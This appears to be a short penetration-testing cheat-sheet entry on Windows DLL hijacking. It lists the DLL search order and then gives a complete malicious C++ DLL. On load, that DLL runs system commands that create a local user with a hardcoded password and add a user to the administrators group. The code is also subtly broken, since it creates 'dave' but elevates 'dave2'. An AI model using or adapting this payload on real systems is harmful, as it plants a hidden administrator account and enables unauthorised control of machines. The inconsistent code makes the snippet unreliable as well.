---
title: DLL Hijacking
tags:
  - C++
  - Development
  - Exploitation
---

### Entry Point

```powershell 
# DLL search order
# 1. The directory from which the application loaded.
# 2. The system directory.
# 3. The 16-bit system directory.
# 4. The Windows directory. 
# 5. The current directory.
# 6. The directories that are listed in the PATH environment variable.

# Display windows path
$Env:Path

# Analyze executable
Procmon.exe
```

---

### Malicious DLL (C++)

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
            // Create new user dave
            i = system ("net user dave password123! /add");
            // Give him admin rights
            i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

[!ref](/cross-compile-cpp.md)

